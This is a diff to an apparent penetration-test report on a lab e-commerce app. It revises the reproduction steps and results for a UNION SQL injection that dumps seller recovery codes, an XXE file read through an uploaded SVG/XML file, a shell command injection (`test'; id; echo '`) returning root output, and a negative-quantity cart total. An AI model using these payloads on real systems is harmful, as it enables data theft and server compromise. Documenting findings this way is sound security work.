@@ -31,7 +31,7 @@ The core issue is that the application trusts user input as part of the query st
 5. **Enumeration Phase:** First, determine the column count by injecting `' ORDER BY 1--`, `' ORDER BY 2--`, etc., until an error occurs. Once 4 columns are confirmed, find the string-compatible column by injecting `' UNION SELECT NULL,'test',NULL,NULL--`.
 6. **Exploitation Phase:** Modify the parameter value to extract target data: `' UNION SELECT id,recovery_code,0,username FROM sellers-- `
 7. Forward the modified request to the server.
-8. Observe the HTTP response containing seller recovery codes rendered within the product list HTML.
+8. Observe the HTTP response containing seller recovery codes (e.g., `e5a4c1b9a59f8277` for `seller1`) rendered as product titles within the HTML.
 
 ### Proof of Concept
 
@@ -97,14 +97,14 @@ Because `resolve_entities=True` is misconfigured on the backend, the parser read
 1. Authenticate to the application as a seller (`seller1`).
 2. Navigate to the Seller Dashboard and initiate a new product creation.
 3. Intercept the product creation `multipart/form-data` request using Burp Suite.
-4. Replace the image file content with a malicious SVG payload targeting `/app/data/canary_xxe.txt`.
+4. Replace the image file content with a malicious XML/SVG payload targeting `/app/data/canary_xxe.txt` (as seen in the screenshot using the filename `xx.xml`).
 5. Forward the modified request to the server.
-6. Navigate to the newly created product's detail page.
-7. Observe the contents of the target server file seamlessly reflected in the image title or description field.
+6. Navigate back to the Seller Dashboard.
+7. Observe the contents of the target server file (e.g., the hash `12bd989ee9f66efeae8ecb3448f45e86`) seamlessly reflected in the green "Caption set" success message.
 
 ### Proof of Concept
 
-**Payload (evil.svg):**
+**Payload (xx.xml):**
 ```xml
 <?xml version="1.0"?>
 <!DOCTYPE svg [
@@ -202,6 +202,13 @@ subprocess.run(f"label-printer {recipient_name} --order {order_id}", shell=True)
 label-printer test'; id; echo ' --order 12345
 ```
 
+**Observed Output in UI:**
+```text
+Label printed for test
+uid=0(root) gid=0(root) groups=0(root)
+ --order 4
+```
+
 ![Command Injection PoC](./ss/6.png)
 
 ### Impact
@@ -254,31 +261,31 @@ By intercepting the HTTP request before it reaches the server, an attacker bypas
 2. Add one or more products to the shopping cart.
 3. Intercept the cart update API request using Burp Suite to bypass HTML/JS frontend protections.
 4. Locate the JSON payload containing the product ID and quantity.
-5. Modify the `quantity` parameter to a negative value (e.g., `-1`).
+5. Modify the `quantity` parameter for an item (e.g., the Yoga Mat) to a large negative value (e.g., `-13`).
 6. Forward the request to update the cart state on the server.
 7. Proceed through the checkout flow.
-8. Observe that the order successfully completes with a total charge of `$0.00` or less.
+8. Observe that the subtotal for that item becomes negative (e.g., `₹-12987.00`), causing the final cart total to calculate to a negative value (e.g., `₹-7689.00`).
 
 ### Proof of Concept
 
 **Payload:**
 ```json
 {
-  "product_id": 2,
-  "quantity": -1
+  "product_id": 3,
+  "quantity": -13
 }
 ```
 
 **Original Calculation Context:**
 ```python
-# Assuming price is $100 and expected quantity is 1
-order_total = 100 * 1  # Total = $100
+# Assuming price is ₹999.00 and expected quantity is 1
+order_total = 999.00 * 1  # Total = ₹999.00
 ```
 
 **Modified Calculation Executed by Backend:**
 ```python
-# Assuming price is $100 and injected quantity is -1
-order_total = 100 * -1 # Total = -$100
+# Assuming price is ₹999.00 and injected quantity is -13
+order_total = 999.00 * -13 # Total = ₹-12987.00
 ```
 
 ![Business Logic PoC](./ss/11.png)
